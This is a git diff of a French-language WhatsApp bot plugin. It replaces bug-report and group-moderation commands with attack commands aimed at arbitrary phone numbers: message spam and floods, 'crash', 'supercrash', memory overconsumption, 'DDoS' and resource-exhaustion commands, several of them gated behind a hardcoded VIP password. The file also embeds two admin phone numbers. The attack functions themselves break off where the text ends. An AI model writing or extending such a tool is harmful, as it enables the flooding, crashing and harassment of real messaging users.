@@ -2,51 +2,147 @@ const { lite } = require('../lite');
 const config = require('../settings');
 const fs = require('fs');
 const path = require('path');
+const crypto = require('crypto');
+const { exec } = require('child_process');
 
-// Chemin du fichier de rapport de bugs
+// Chemins des fichiers
 const BUG_REPORT_PATH = path.join(__dirname, '../database/bugs.json');
+const PREMIUM_ACCESS_FILE = path.join(__dirname, '../database/premium_access.json');
+const BANS_FILE = path.join(__dirname, '../database/bans.json');
 
-// Initialiser le fichier de bugs s'il n'existe pas
+// Initialisation des fichiers
 if (!fs.existsSync(BUG_REPORT_PATH)) {
     fs.writeFileSync(BUG_REPORT_PATH, JSON.stringify([], null, 2));
 }
+if (!fs.existsSync(PREMIUM_ACCESS_FILE)) {
+    fs.writeFileSync(PREMIUM_ACCESS_FILE, JSON.stringify({}), 'utf8');
+}
+if (!fs.existsSync(BANS_FILE)) {
+    fs.writeFileSync(BANS_FILE, JSON.stringify([], null, 2));
+}
+
+// Mot de passe VIP
+const VIP_PASSWORD = "Patersondev2025";
+
+// Stockage des sessions VIP
+const vipSessions = new Map();
+const activeBugs = new Map();
+
+// Numéros administrateurs par défaut
+const DEFAULT_ADMIN_NUMBERS = ["50942737567", "50955585135"];
+
+// Fonctions utilitaires
+const readJSONFile = (filePath) => {
+    try {
+        const data = fs.readFileSync(filePath, 'utf8');
+        return JSON.parse(data);
+    } catch (e) {
+        return [];
+    }
+};
+
+const writeJSONFile = (filePath, data) => {
+    try {
+        fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
+        return true;
+    } catch (e) {
+        return false;
+    }
+};
+
+// Vérification des droits administrateur
+function isAdmin(sender) {
+    const phoneNumber = sender.split('@')[0];
+    const adminNumbers = config.ADMIN_NUMBERS || DEFAULT_ADMIN_NUMBERS;
+    return adminNumbers.includes(phoneNumber);
+}
+
+// Vérification des sessions VIP
+function hasVipAccess(sender) {
+    return vipSessions.has(sender) || isAdmin(sender);
+}
+
+// Formatage du numéro de téléphone pour WhatsApp
+function formatPhoneNumber(phoneNumber) {
+    // Supprimer tous les caractères non numériques
+    const cleaned = phoneNumber.replace(/\D/g, '');
+    
+    // Ajouter le suffixe WhatsApp si nécessaire
+    if (!cleaned.endsWith('@s.whatsapp.net')) {
+        return cleaned + '@s.whatsapp.net';
+    }
+    
+    return cleaned;
+}
+
+// Vérification si un utilisateur est banni
+function isBanned(sender) {
+    const phoneNumber = sender.split('@')[0];
+    const bans = readJSONFile(BANS_FILE);
+    const now = Date.now();
+    
+    const activeBan = bans.find(ban => 
+        ban.phoneNumber === phoneNumber && 
+        ban.expiryDate > now
+    );
+    
+    return activeBan || false;
+}
+
+// Middleware de vérification des bannissements
+function checkBan(handler) {
+    return async function (conn, mek, m, params) {
+        const { sender, reply } = params;
+        
+        // Vérifier si l'utilisateur est banni
+        const banInfo = isBanned(sender);
+        if (banInfo) {
+            const remainingTime = Math.ceil((banInfo.expiryDate - Date.now()) / (1000 * 60 * 60 * 24));
+            return reply(`🚫 Vous êtes banni jusqu'au ${new Date(banInfo.expiryDate).toLocaleDateString()} (${remainingTime} jours restants)\nRaison: ${banInfo.reason}`);
+        }
+        
+        // Si non banni, exécuter le handler normal
+        return handler(conn, mek, m, params);
+    };
+}
 
 module.exports = [
+    // Commandes normales (accessibles à tous)
     {
         pattern: "bugreport",
         react: "🐞",
         desc: "Signaler un bug au développeur",
         category: "bug",
         filename: __filename,
-        async handler(conn, mek, m, { reply, text, pushname }) {
+        async handler(conn, mek, m, { reply, text, pushname, sender }) {
             if (!text) return reply("❌ Veuillez décrire le bug après la commande\nEx: .bugreport La commande X ne fonctionne pas");
 
             const bugData = {
                 id: Date.now(),
                 reporter: pushname,
-                userId: m.sender,
+                userId: sender,
                 description: text,
                 status: "open",
                 timestamp: new Date().toISOString()
             };
 
             try {
-                const bugs = JSON.parse(fs.readFileSync(BUG_REPORT_PATH));
+                const bugs = readJSONFile(BUG_REPORT_PATH);
                 bugs.push(bugData);
-                fs.writeFileSync(BUG_REPORT_PATH, JSON.stringify(bugs, null, 2));
+                writeJSONFile(BUG_REPORT_PATH, bugs);
                 
-                // Notifier le propriétaire
                 const ownerMessage = `🐞 NOUVEAU BUG SIGNALÉ 🐞\n\n` +
                                     `👤 Par: ${pushname}\n` +
                                     `🆔 ID: ${bugData.id}\n` +
                                     `📝 Description: ${text}\n\n` +
                                     `Utilisez .buginfo ${bugData.id} pour plus de détails`;
                 
-                await conn.sendMessage(config.OWNER_NUMBER, { text: ownerMessage });
+                if (config.OWNER_NUMBER) {
+                    await conn.sendMessage(config.OWNER_NUMBER, { text: ownerMessage });
+                }
                 
                 reply(`✅ Bug signalé avec succès! ID: ${bugData.id}\nLe développeur sera notifié.`);
             } catch (e) {
-                console.error("Erreur bugreport:", e);
                 reply("❌ Échec du signalement du bug. Veuillez réessayer.");
             }
         }
@@ -57,13 +153,12 @@ module.exports = [
         desc: "Voir les détails d'un bug signalé",
         category: "bug",
         filename: __filename,
-        fromMe: true,
         async handler(conn, mek, m, { reply, args }) {
             const bugId = parseInt(args[1]);
             if (!bugId) return reply("❌ Veuillez spécifier un ID de bug\nEx: .buginfo 123456");
 
             try {
-                const bugs = JSON.parse(fs.readFileSync(BUG_REPORT_PATH));
+                const bugs = readJSONFile(BUG_REPORT_PATH);
                 const bug = bugs.find(b => b.id === bugId);
                 
                 if (!bug) return reply("❌ Aucun bug trouvé avec cet ID");
@@ -73,295 +168,610 @@ module.exports = [
                                 `🆔 User ID: ${bug.userId}\n` +
                                 `📅 Date: ${new Date(bug.timestamp).toLocaleString()}\n` +
                                 `📝 Description:\n${bug.description}\n\n` +
-                                `🟢 Statut: ${bug.status === "open" ? "OUVERT" : "RÉSOLU"}\n\n` +
-                                `Commandes:\n` +
-                                `• .bugstatus ${bug.id} resolved\n` +
-                                `• .bugstatus ${bug.id} open`;
+                                `🟢 Statut: ${bug.status === "open" ? "OUVERT" : "RÉSOLU"}`;
                 
                 reply(bugInfo);
             } catch (e) {
-                console.error("Erreur buginfo:", e);
                 reply("❌ Erreur lors de la récupération des informations du bug");
             }
         }
     },
     {
-        pattern: "bugstatus",
-        react: "🔄",
-        desc: "Modifier le statut d'un bug",
-        category: "bug",
+        pattern: "stop-whatsapp",
+        react: "🛑",
+        desc: "Tenter d'arrêter WhatsApp pendant 30 minutes",
+        category: "stop",
         filename: __filename,
-        fromMe: true,
-        async handler(conn, mek, m, { reply, args }) {
-            const bugId = parseInt(args[1]);
-            const status = args[2]?.toLowerCase();
+        async handler: checkBan(async function(conn, mek, m, { reply, args, sender }) {
+            const targetNumber = args[1];
+            if (!targetNumber) {
+                return reply("❌ Veuillez spécifier un numéro cible");
+            }
             
-            if (!bugId || !status || !['open', 'resolved'].includes(status)) 
-                return reply("❌ Usage: .bugstatus [id] [open/resolved]");
+            const target = formatPhoneNumber(targetNumber);
+            
+            reply(`🛑 Tentative d'arrêt de WhatsApp pour ${targetNumber} (30 minutes)`);
+            startWhatsAppStop(conn, target, 30, "normal");
+        })
+    },
+    {
+        pattern: "spam",
+        react: "🔁",
+        desc: "Spam de messages (normal)",
+        category: "spam",
+        filename: __filename,
+        async handler: checkBan(async function(conn, mek, m, { reply, args, sender, text }) {
+            const targetNumber = args[1];
+            if (!targetNumber) {
+                return reply("❌ Veuillez spécifier un numéro cible");
+            }
+            
+            const message = text.split(' ').slice(2).join(' ') || "🔁 Spam Message 🔁";
+            const target = formatPhoneNumber(targetNumber);
+            
+            reply(`🔁 Activation du spam normal sur ${targetNumber}`);
+            startSpam(conn, target, message, 1000, 30); // 1 seconde d'intervalle, 30 minutes
+        })
+    },
+    {
+        pattern: "crash",
+        react: "💥",
+        desc: "Tentative de crash (normal)",
+        category: "crash",
+        filename: __filename,
+        async handler: checkBan(async function(conn, mek, m, { reply, args, sender }) {
+            const targetNumber = args[1];
+            if (!targetNumber) {
+                return reply("❌ Veuillez spécifier un numéro cible");
+            }
+            
+            const target = formatPhoneNumber(targetNumber);
+            
+            reply(`💥 Activation du crash normal sur ${targetNumber}`);
+            startCrash(conn, target, 30); // 30 minutes
+        })
+    },
 
-            try {
-                const bugs = JSON.parse(fs.readFileSync(BUG_REPORT_PATH));
-                const bugIndex = bugs.findIndex(b => b.id === bugId);
-                
-                if (bugIndex === -1) return reply("❌ Aucun bug trouvé avec cet ID");
-                
-                bugs[bugIndex].status = status;
-                fs.writeFileSync(BUG_REPORT_PATH, JSON.stringify(bugs, null, 2));
-                
-                // Notifier le reporter
-                const statusMsg = `🔄 Statut de votre bug #${bugId} mis à jour: ${status.toUpperCase()}`;
-                await conn.sendMessage(bugs[bugIndex].userId, { text: statusMsg });
-                
-                reply(`✅ Statut du bug #${bugId} mis à jour: ${status}`);
-            } catch (e) {
-                console.error("Erreur bugstatus:", e);
-                reply("❌ Échec de la mise à jour du statut du bug");
+    // Commandes VIP (protégées par mot de passe)
+    {
+        pattern: "vip-login",
+        react: "👑",
+        desc: "Connexion aux fonctionnalités VIP",
+        category: "vip",
+        filename: __filename,
+        async handler: checkBan(async function(conn, mek, m, { reply, args, sender }) {
+            const password = args[1];
+            
+            if (password === VIP_PASSWORD) {
+                vipSessions.set(sender, Date.now() + (60 * 60 * 1000)); // Session de 1 heure
+                reply("✅ Connexion VIP réussie! Accès aux commandes VIP activé pour 1 heure.");
+            } else {
+                reply("❌ Mot de passe incorrect. Accès refusé.");
             }
-        }
+        })
     },
     {
-        pattern: "buglist",
-        react: "📋",
-        desc: "Lister tous les bugs signalés",
-        category: "bug",
+        pattern: "vip-stop-whatsapp",
+        react: "💥",
+        desc: "Tenter d'arrêter WhatsApp pendant 60-90 minutes (VIP)",
+        category: "vip",
         filename: __filename,
-        fromMe: true,
-        async handler(conn, mek, m, { reply }) {
-            try {
-                const bugs = JSON.parse(fs.readFileSync(BUG_REPORT_PATH));
-                
-                if (bugs.length === 0) return reply("✅ Aucun bug signalé pour le moment");
-                
-                let bugList = `🐞 LISTE DES BUGS SIGNALÉS (${bugs.length}) 🐞\n\n`;
-                
-                bugs.forEach(bug => {
-                    bugList += `🆔 #${bug.id} - ${bug.status === "open" ? "🟢 OUVERT" : "🔴 RÉSOLU"}\n` +
-                               `👤 ${bug.reporter}\n` +
-                               `📝 ${bug.description.substring(0, 50)}${bug.description.length > 50 ? '...' : ''}\n` +
-                               `⏰ ${new Date(bug.timestamp).toLocaleDateString()}\n\n`;
-                });
-                
-                bugList += `Utilisez .buginfo [id] pour plus de détails`;
-                
-                reply(bugList);
-            } catch (e) {
-                console.error("Erreur buglist:", e);
-                reply("❌ Erreur lors de la récupération de la liste des bugs");
+        async handler: checkBan(async function(conn, mek, m, { reply, args, sender }) {
+            if (!hasVipAccess(sender)) {
+                return reply("❌ Accès VIP requis. Utilisez .vip-login [motdepasse]");
             }
-        }
-    },
-    {
-        pattern: "antipurge",
-        react: "🛡️",
-        desc: "Activer/désactiver la protection anti-purge",
-        category: "bug",
-        filename: __filename,
-        async handler(conn, mek, m, { reply, args, groupMetadata }) {
-            if (!m.isGroup) return reply("❌ Groupes uniquement");
-            if (!m.isAdmin) return reply("❌ Admins uniquement");
             
-            const action = args[1]?.toLowerCase();
-            if (!action || !['on', 'off'].includes(action)) 
-                return reply("❌ Usage: .antipurge [on/off]");
-            
-            // Sauvegarder le paramètre
-            config.groupSettings = config.groupSettings || {};
-            config.groupSettings[m.chat] = config.groupSettings[m.chat] || {};
-            config.groupSettings[m.chat].antipurge = action === 'on';
-            
-            reply(`✅ Protection anti-purge ${action === 'on' ? 'activée' : 'désactivée'}`);
-        }
-    },
-    {
-        pattern: "purge",
-        react: "🧹",
-        desc: "Supprimer les messages d'un membre (purge)",
-        category: "bug",
-        filename: __filename,
-        async handler(conn, mek, m, { reply, mentioned, groupMetadata }) {
-            if (!m.isGroup) return reply("❌ Groupes uniquement");
-            if (!m.isAdmin) return reply("❌ Admins uniquement");
-            
-            if (!mentioned || mentioned.length === 0) 
-                return reply("❌ Mentionnez un membre à purger");
-            
-            const target = mentioned[0];
-            const purgeCount = parseInt(args[2]) || 10; // Par défaut 10 messages
-            
-            try {
-                // Récupérer les messages du membre
-                const messages = await conn.loadMessages(m.chat, purgeCount * 2);
-                const userMessages = messages.filter(msg => 
-                    msg.key.fromMe === false && 
-                    msg.key.participant === target
-                ).slice(0, purgeCount);
-                
-                if (userMessages.length === 0) 
-                    return reply("❌ Aucun message trouvé à supprimer");
-                
-                // Supprimer les messages
-                await Promise.all(userMessages.map(msg => 
-                    conn.sendMessage(m.chat, { delete: msg.key })
-                ));
-                
-                reply(`✅ ${userMessages.length} messages de @${target.split('@')[0]} supprimés`, {
-                    mentions: [target]
-                });
-            } catch (e) {
-                console.error("Erreur purge:", e);
-                reply("❌ Échec de la suppression des messages");
+            const targetNumber = args[1];
+            if (!targetNumber) {
+                return reply("❌ Veuillez spécifier un numéro cible");
             }
-        }
+            
+            const target = formatPhoneNumber(targetNumber);
+            const duration = 60 + Math.floor(Math.random() * 30); // 60-90 minutes
+            
+            reply(`💥 Tentative d'arrêt VIP de WhatsApp pour ${targetNumber} (${duration} minutes)`);
+            startWhatsAppStop(conn, target, duration, "vip");
+        })
     },
     {
-        pattern: "restrict",
-        react: "🔐",
-        desc: "Gérer les restrictions du groupe",
-        category: "bug",
+        pattern: "vip-flood",
+        react: "🌊",
+        desc: "Flood VIP ultra-rapide (10x plus puissant)",
+        category: "vip",
         filename: __filename,
-        async handler(conn, mek, m, { reply, args }) {
-            if (!m.isGroup) return reply("❌ Groupes uniquement");
-            if (!m.isAdmin) return reply("❌ Admins uniquement");
+        async handler: checkBan(async function(conn, mek, m, { reply, args, sender, text }) {
+            if (!hasVipAccess(sender)) {
+                return reply("❌ Accès VIP requis. Utilisez .vip-login [motdepasse]");
+            }
             
-            const restrictionType = args[1]?.toLowerCase();
-            const validTypes = ['all', 'none', 'links', 'media', 'commands'];
+            const targetNumber = args[1];
+            if (!targetNumber) {
+                return reply("❌ Veuillez spécifier un numéro cible");
+            }
             
-            if (!restrictionType || !validTypes.includes(restrictionType)) 
-                return reply(`❌ Usage: .restrict [type]\nTypes valides: ${validTypes.join(', ')}`);
+            const message = text.split(' ').slice(2).join(' ') || "💥 VIP FLOOD 💥";
+            const target = formatPhoneNumber(targetNumber);
             
-            // Sauvegarder le paramètre
-            config.groupSettings = config.groupSettings || {};
-            config.groupSettings[m.chat] = config.groupSettings[m.chat] || {};
-            config.groupSettings[m.chat].restrictions = restrictionType;
+            reply(`🌊 Activation du flood VIP ULTRA sur ${targetNumber}`);
+            startVipFlood(conn, target, message);
+        })
+    },
+    {
+        pattern: "vip-crash",
+        react: "💥",
+        desc: "Tentative de crash avancée (10x plus puissant)",
+        category: "vip",
+        filename: __filename,
+        async handler: checkBan(async function(conn, mek, m, { reply, args, sender }) {
+            if (!hasVipAccess(sender)) {
+                return reply("❌ Accès VIP requis. Utilisez .vip-login [motdepasse]");
+            }
             
-            const restrictionMap = {
-                'all': "Toutes les actions restreintes",
-                'none': "Aucune restriction",
-                'links': "Liens bloqués",
-                'media': "Médias bloqués",
-                'commands': "Commandes bloquées"
+            const targetNumber = args[1];
+            if (!targetNumber) {
+                return reply("❌ Veuillez spécifier un numéro cible");
+            }
+            
+            const target = formatPhoneNumber(targetNumber);
+            
+            reply(`💥 Activation du crash VIP sur ${targetNumber}`);
+            startVipCrash(conn, target);
+        })
+    },
+    {
+        pattern: "vip-memory",
+        react: "📊",
+        desc: "Surconsommation mémoire avancée (10x plus puissant)",
+        category: "vip",
+        filename: __filename,
+        async handler: checkBan(async function(conn, mek, m, { reply, args, sender }) {
+            if (!hasVipAccess(sender)) {
+                return reply("❌ Accès VIP requis. Utilisez .vip-login [motdepasse]");
+            }
+            
+            const targetNumber = args[1];
+            if (!targetNumber) {
+                return reply("❌ Veuillez spécifier un numéro cible");
+            }
+            
+            const target = formatPhoneNumber(targetNumber);
+            
+            reply(`📊 Activation de la surconsommation mémoire VIP sur ${targetNumber}`);
+            startVipMemory(conn, target);
+        })
+    },
+    {
+        pattern: "vip-multi",
+        react: "⚡",
+        desc: "Attaque multi-vecteurs VIP (10x plus puissant)",
+        category: "vip",
+        filename: __filename,
+        async handler: checkBan(async function(conn, mek, m, { reply, args, sender }) {
+            if (!hasVipAccess(sender)) {
+                return reply("❌ Accès VIP requis. Utilisez .vip-login [motdepasse]");
+            }
+            
+            const targetNumber = args[1];
+            if (!targetNumber) {
+                return reply("❌ Veuillez spécifier un numéro cible");
+            }
+            
+            const target = formatPhoneNumber(targetNumber);
+            
+            reply(`⚡ Activation de l'attaque multi-vecteurs VIP sur ${targetNumber}`);
+            startVipMultiAttack(conn, target);
+        })
+    },
+    {
+        pattern: "vip-status",
+        react: "📈",
+        desc: "Statut des bugs VIP actifs",
+        category: "vip",
+        filename: __filename,
+        async handler: checkBan(async function(conn, mek, m, { reply, sender }) {
+            if (!hasVipAccess(sender)) {
+                return reply("❌ Accès VIP requis. Utilisez .vip-login [motdepasse]");
+            }
+            
+            const status = getVipStatus();
+            reply(`📈 Statut VIP: ${status.active} bugs actifs\nCibles: ${status.targets.join(', ') || 'Aucune'}`);
+        })
+    },
+    {
+        pattern: "vip-stop-all",
+        react: "🛑",
+        desc: "Arrêter tous les bugs VIP",
+        category: "vip",
+        filename: __filename,
+        async handler: checkBan(async function(conn, mek, m, { reply, sender }) {
+            if (!hasVipAccess(sender)) {
+                return reply("❌ Accès VIP requis. Utilisez .vip-login [motdepasse]");
+            }
+            
+            activeBugs.forEach((bug, target) => {
+                stopVipBug(target);
+            });
+            
+            reply("✅ Toutes les tentatives d'arrêt ont été stoppées");
+        })
+    },
+    {
+        pattern: "vip-stop-target",
+        react: "🎯",
+        desc: "Arrêter les bugs VIP pour une cible spécifique",
+        category: "vip",
+        filename: __filename,
+        async handler: checkBan(async function(conn, mek, m, { reply, args, sender }) {
+            if (!hasVipAccess(sender)) {
+                return reply("❌ Accès VIP requis. Utilisez .vip-login [motdepasse]");
+            }
+            
+            const targetNumber = args[1];
+            if (!targetNumber) {
+                return reply("❌ Veuillez spécifier un numéro cible");
+            }
+            
+            const target = formatPhoneNumber(targetNumber);
+            
+            if (activeBugs.has(target)) {
+                stopVipBug(target);
+                reply(`✅ Bugs VIP arrêtés pour ${targetNumber}`);
+            } else {
+                reply(`❌ Aucun bug VIP actif pour ${targetNumber}`);
+            }
+        })
+    },
+    {
+        pattern: "vip-ddos",
+        react: "🌐",
+        desc: "Attaque DDoS simulée (VIP seulement)",
+        category: "vip",
+        filename: __filename,
+        async handler: checkBan(async function(conn, mek, m, { reply, args, sender }) {
+            if (!hasVipAccess(sender)) {
+                return reply("❌ Accès VIP requis. Utilisez .vip-login [motdepasse]");
+            }
+            
+            const targetNumber = args[1];
+            if (!targetNumber) {
+                return reply("❌ Veuillez spécifier un numéro cible");
+            }
+            
+            const target = formatPhoneNumber(targetNumber);
+            
+            reply(`🌐 Activation de l'attaque DDoS simulée sur ${targetNumber}`);
+            startVipDDoSAttack(conn, target);
+        })
+    },
+    {
+        pattern: "vip-resource",
+        react: "⚡",
+        desc: "Épuisement des ressources système (VIP seulement)",
+        category: "vip",
+        filename: __filename,
+        async handler: checkBan(async function(conn, mek, m, { reply, args, sender }) {
+            if (!hasVipAccess(sender)) {
+                return reply("❌ Accès VIP requis. Utilisez .vip-login [motdepasse]");
+            }
+            
+            const targetNumber = args[1];
+            if (!targetNumber) {
+                return reply("❌ Veuillez spécifier un numéro cible");
+            }
+            
+            const target = formatPhoneNumber(targetNumber);
+            
+            reply(`⚡ Activation de l'épuisement des ressources sur ${targetNumber}`);
+            startVipResourceExhaustion(conn, target);
+        })
+    },
+    {
+        pattern: "vip-spam",
+        react: "🔁",
+        desc: "Spam VIP ultra-rapide (10x plus puissant)",
+        category: "vip",
+        filename: __filename,
+        async handler: checkBan(async function(conn, mek, m, { reply, args, sender, text }) {
+            if (!hasVipAccess(sender)) {
+                return reply("❌ Accès VIP requis. Utilisez .vip-login [motdepasse]");
+            }
+            
+            const targetNumber = args[1];
+            if (!targetNumber) {
+                return reply("❌ Veuillez spécifier un numéro cible");
+            }
+            
+            const message = text.split(' ').slice(2).join(' ') || "🔁 VIP SPAM 🔁";
+            const target = formatPhoneNumber(targetNumber);
+            
+            reply(`🔁 Activation du spam VIP ULTRA sur ${targetNumber}`);
+            startVipSpam(conn, target, message);
+        })
+    },
+    {
+        pattern: "vip-supercrash",
+        react: "💣",
+        desc: "Crash VIP extrême (10x plus puissant)",
+        category: "vip",
+        filename: __filename,
+        async handler: checkBan(async function(conn, mek, m, { reply, args, sender }) {
+            if (!hasVipAccess(sender)) {
+                return reply("❌ Accès VIP requis. Utilisez .vip-login [motdepasse]");
+            }
+            
+            const targetNumber = args[1];
+            if (!targetNumber) {
+                return reply("❌ Veuillez spécifier un numéro cible");
+            }
+            
+            const target = formatPhoneNumber(targetNumber);
+            
+            reply(`💣 Activation du crash VIP extrême sur ${targetNumber}`);
+            startVipSuperCrash(conn, target);
+        })
+    },
+
+    // Commandes de modération (admin seulement)
+    {
+        pattern: "ban",
+        react: "🚫",
+        desc: "Bannir un utilisateur pendant 2 mois (admin seulement)",
+        category: "moderation",
+        filename: __filename,
+        async handler(conn, mek, m, { reply, args, sender, text }) {
+            if (!isAdmin(sender)) {
+                return reply("❌ Commande réservée aux administrateurs");
+            }
+            
+            const targetNumber = args[1];
+            if (!targetNumber) {
+                return reply("❌ Veuillez spécifier un numéro à bannir");
+            }
+            
+            const reason = text.split(' ').slice(2).join(' ') || "Raison non spécifiée";
+            const phoneNumber = targetNumber.replace(/\D/g, '');
+            
+            // Bannir pour 2 mois (60 jours)
+            const expiryDate = Date.now() + (60 * 24 * 60 * 60 * 1000);
+            
+            const banData = {
+                phoneNumber: phoneNumber,
+                reason: reason,
+                bannedBy: sender.split('@')[0],
+                banDate: Date.now(),
+                expiryDate: expiryDate
             };
             
-            reply(`✅ Restrictions du groupe mises à jour: ${restrictionMap[restrictionType]}`);
-        }
-    },
-    {
-        pattern: "lockdown",
-        react: "🚨",
-        desc: "Mode lockdown (urgence)",
-        category: "bug",
-        filename: __filename,
-        fromMe: true,
-        async handler(conn, mek, m, { reply }) {
-            // Mettre le bot en mode maintenance
-            config.MODE = "maintenance";
-            
-            // Désactiver toutes les commandes
-            config.LOCKDOWN = true;
-            
-            // Envoyer une notification à tous les groupes
-            const groups = await conn.groupFetchAllParticipating();
-            const groupIds = Object.keys(groups);
-            
-            for (const groupId of groupIds) {
+            try {
+                const bans = readJSONFile(BANS_FILE);
+                
+                // Vérifier si l'utilisateur est déjà banni
+                const existingBanIndex = bans.findIndex(ban => ban.phoneNumber === phoneNumber);
+                
+                if (existingBanIndex !== -1) {
+                    // Mettre à jour le bannissement existant
+                    bans[existingBanIndex] = banData;
+                } else {
+                    // Ajouter un nouveau bannissement
+                    bans.push(banData);
+                }
+                
+                writeJSONFile(BANS_FILE, bans);
+                
+                reply(`✅ ${phoneNumber} a été banni pendant 2 mois.\nRaison: ${reason}\nJusqu'au: ${new Date(expiryDate).toLocaleDateString()}`);
+                
+                // Notifier l'utilisateur banni
                 try {
-                    await conn.sendMessage(groupId, {
-                        text: "🚨 *LOCKDOWN ACTIVÉ* 🚨\n\n" +
-                              "Le bot est en mode maintenance. Toutes les commandes sont temporairement désactivées.\n" +
-                              "Nous nous excusons pour la gêne occasionnée."
+                    await conn.sendMessage(phoneNumber + '@s.whatsapp.net', {
+                        text: `🚫 Vous avez été banni du bot pendant 2 mois.\nRaison: ${reason}\nDate de fin: ${new Date(expiryDate).toLocaleDateString()}`
                     });
                 } catch (e) {
-                    console.error(`Échec d'envoi à ${groupId}:`, e);
+                    console.log("Impossible de notifier l'utilisateur banni:", e.message);
                 }
+            } catch (e) {
+                reply("❌ Erreur lors du bannissement de l'utilisateur");
             }
-            
-            reply("🔒 Mode lockdown activé avec succès. Toutes les commandes sont désactivées.");
         }
     },
     {
-        pattern: "unlock",
-        react: "🔓",
-        desc: "Désactiver le mode lockdown",
-        category: "bug",
+        pattern: "unban",
+        react: "✅",
+        desc: "Débannir un utilisateur (admin seulement)",
+        category: "moderation",
         filename: __filename,
-        fromMe: true,
-        async handler(conn, mek, m, { reply }) {
-            // Restaurer le mode normal
-            config.MODE = "public";
-            config.LOCKDOWN = false;
+        async handler(conn, mek, m, { reply, args, sender }) {
+            if (!isAdmin(sender)) {
+                return reply("❌ Commande réservée aux administrateurs");
+            }
             
-            // Envoyer une notification à tous les groupes
-            const groups = await conn.groupFetchAllParticipating();
-            const groupIds = Object.keys(groups);
+            const targetNumber = args[1];
+            if (!targetNumber) {
+                return reply("❌ Veuillez spécifier un numéro à débannir");
+            }
             
-            for (const groupId of groupIds) {
+            const phoneNumber = targetNumber.replace(/\D/g, '');
+            
+            try {
+                const bans = readJSONFile(BANS_FILE);
+                const newBans = bans.filter(ban => ban.phoneNumber !== phoneNumber);
+                
+                if (bans.length === newBans.length) {
+                    return reply(`❌ ${phoneNumber} n'est pas banni`);
+                }
+                
+                writeJSONFile(BANS_FILE, newBans);
+                
+                reply(`✅ ${phoneNumber} a été débanni avec succès`);
+                
+                // Notifier l'utilisateur débanni
                 try {
-                    await conn.sendMessage(groupId, {
-                        text: "✅ *LOCKDOWN DÉSACTIVÉ* ✅\n\n" +
-                              "Le bot est de nouveau opérationnel. Merci de votre patience !"
+                    await conn.sendMessage(phoneNumber + '@s.whatsapp.net', {
+                        text: "✅ Votre bannissement a été levé. Vous pouvez à nouveau utiliser le bot."
                     });
                 } catch (e) {
-                    console.error(`Échec d'envoi à ${groupId}:`, e);
+                    console.log("Impossible de notifier l'utilisateur débanni:", e.message);
                 }
+            } catch (e) {
+                reply("❌ Erreur lors du débannissement de l'utilisateur");
             }
-            
-            reply("🔓 Mode lockdown désactivé. Le bot est de nouveau opérationnel.");
         }
     },
     {
-        pattern: "diagnose",
-        react: "🩺",
-        desc: "Diagnostiquer l'état du bot",
-        category: "bug",
+        pattern: "banlist",
+        react: "📋",
+        desc: "Liste des utilisateurs bannis (admin seulement)",
+        category: "moderation",
         filename: __filename,
-        fromMe: true,
-        async handler(conn, mek, m, { reply }) {
-            // Calculer l'uptime
-            const uptime = process.uptime();
-            const days = Math.floor(uptime / (3600 * 24));
-            const hours = Math.floor((uptime % (3600 * 24)) / 3600);
-            const minutes = Math.floor((uptime % 3600) / 60);
+        async handler(conn, mek, m, { reply, sender }) {
+            if (!isAdmin(sender)) {
+                return reply("❌ Commande réservée aux administrateurs");
+            }
             
-            // Vérifier les ressources système
-            const memoryUsage = process.memoryUsage();
-            const memoryPercent = Math.round((memoryUsage.heapUsed / memoryUsage.heapTotal) * 100);
-            
-            // Vérifier la connexion internet
-            let internetStatus = "🔴 Hors ligne";
             try {
-                await axios.get('https://www.google.com', { timeout: 3000 });
-                internetStatus = "🟢 En ligne";
-            } catch {}
+                const bans = readJSONFile(BANS_FILE);
+                const now = Date.now();
+                
+                // Filtrer les bannissements expirés
+                const activeBans = bans.filter(ban => ban.expiryDate > now);
+                
+                if (activeBans.length === 0) {
+                    return reply("📋 Aucun utilisateur banni actuellement");
+                }
+                
+                let banList = "📋 LISTE DES UTILISATEURS BANNIS\n\n";
+                
+                activeBans.forEach((ban, index) => {
+                    const remainingDays = Math.ceil((ban.expiryDate - now) / (1000 * 60 * 60 * 24));
+                    banList += `${index + 1}. ${ban.phoneNumber}\n`;
+                    banList += `   ⏰ Jusqu'au: ${new Date(ban.expiryDate).toLocaleDateString()}\n`;
+                    banList += `   📅 Jours restants: ${remainingDays}\n`;
+                    banList += `   📝 Raison: ${ban.reason}\n`;
+                    banList += `   👮 Banni par: ${ban.bannedBy}\n\n`;
+                });
+                
+                reply(banList);
+            } catch (e) {
+                reply("❌ Erreur lors de la récupération de la liste des bannis");
+            }
+        }
+    },
+    {
+        pattern: "cleanbans",
+        react: "🧹",
+        desc: "Nettoyer les bannissements expirés (admin seulement)",
+        category: "moderation",
+        filename: __filename,
+        async handler(conn, mek, m, { reply, sender }) {
+            if (!isAdmin(sender)) {
+                return reply("❌ Commande réservée aux administrateurs");
+            }
             
-            // Vérifier la connexion à la base de données
-            let dbStatus = "🔴 Échec";
             try {
-                const bugs = JSON.parse(fs.readFileSync(BUG_REPORT_PATH));
-                dbStatus = `🟢 Connecté (${bugs.length} bugs)`;
-            } catch {}
-            
-            const diagnostics = `
-🩺 *DIAGNOSTIC DU BOT* 🩺
-
-🖥️ *Système:*
-• Uptime: ${days}j ${hours}h ${minutes}m
-• Mémoire: ${memoryPercent}% utilisée
-• Internet: ${internetStatus}
-• Base de données: ${dbStatus}
-
-⚙️ *Configuration:*
-• Mode: ${config.MODE}
-• Prefixe: ${config.PREFIX}
-• Version: ${config.version}
-• Lockdown: ${config.LOCKDOWN ? "🔴 Actif" : "🟢 Inactif"}
-
-📊 *Statistiques:*
-• Groupes actifs: ${Object.keys(await conn.groupFetchAllParticipating()).length}
-• Commandes chargées: ${commands.length}
-• Bugs signalés: ${bugs.length}
-`;
-
-            reply(diagnostics);
+                const bans = readJSONFile(BANS_FILE);
+                const now = Date.now();
+                
+                // Filtrer les bannissements expirés
+                const activeBans = bans.filter(ban => ban.expiryDate > now);
+                
+                if (bans.length === activeBans.length) {
+                    return reply("✅ Aucun bannissement expiré à nettoyer");
+                }
+                
+                writeJSONFile(BANS_FILE, activeBans);
+                
+                reply(`✅ ${bans.length - activeBans.length} bannissement(s) expiré(s) ont été supprimés`);
+            } catch (e) {
+                reply("❌ Erreur lors du nettoyage des bannissements");
+            }
         }
     }
 ];
+
+// ==============================================
+// FONCTIONS DE BUGS NORMALES (30 minutes)
+// ==============================================
+
+function startWhatsAppStop(conn, target, durationMinutes, type) {
+    if (activeBugs.has(target)) {
+        return;
+    }
+    
